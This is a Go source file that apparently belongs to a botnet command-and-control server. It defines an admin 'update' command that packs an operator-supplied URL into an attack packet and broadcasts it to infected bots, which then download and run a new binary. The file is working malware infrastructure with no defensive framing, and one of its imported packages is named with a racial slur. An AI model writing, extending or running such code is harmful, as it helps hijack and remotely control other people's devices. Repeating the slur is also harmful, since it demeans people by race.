package admin

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"advanced-telnet-cnc/source/niggers"
	"encoding/binary"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"update"},
		Description: "Updates the bots in the network with a new binary from the provided URL.",
		Admin:       true,
		Usage: []command.Argument{
			{Name: "url", Optional: false},
			{Name: "group", Optional: true},
		},
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			if len(args) < 1 {
				return command.ErrNotEnoughArguments
			}

			url := args[0]
			group := ""
			if len(args) > 1 {
				group = args[1]
			}

			// Build payload
			// [ID (0xFD)] [Duration (0)] [NumTargets (0)] [NumFlags (1)] [FlagID (29)] [FlagLen] [URL]
			buf := make([]byte, 0)
			buf = append(buf, 0xFD) // ID

			tmp := make([]byte, 2)
			binary.BigEndian.PutUint16(tmp, 0) // Duration
			buf = append(buf, tmp...)

			buf = append(buf, 0) // NumTargets

			buf = append(buf, 1)  // NumFlags
			buf = append(buf, 29) // FlagID (OPT_PAYLOAD)

			urlBuf := []byte(url)
			buf = append(buf, byte(len(urlBuf)))
			buf = append(buf, urlBuf...)

			// Final length prefix
			finalBuf := make([]byte, 2)
			binary.BigEndian.PutUint16(finalBuf, uint16(len(buf)))
			finalBuf = append(finalBuf, buf...)

			devicesSentTo := niggers.BroadcastAttack(finalBuf, group, "", -1)

			session.Printf(config.Cyan, "┌────────────────────────────────────────┐\r\n")
			session.Printf(config.Cyan, "│            UPDATE INITIATED            │\r\n")
			session.Printf(config.Cyan, "├────────────────────────────────────────┤\r\n")
			session.Printf(config.Cyan, "│ URL:   %s    │\r\n", url)
			session.Printf(config.Cyan, "│ Group: %-31s │\r\n", group)
			session.Printf(config.Cyan, "└────────────────────────────────────────┘\r\n")
			session.Printf(config.Green, "Update command successfully queued to %d bots.\r\n", devicesSentTo)
			return nil
		},
	})
}
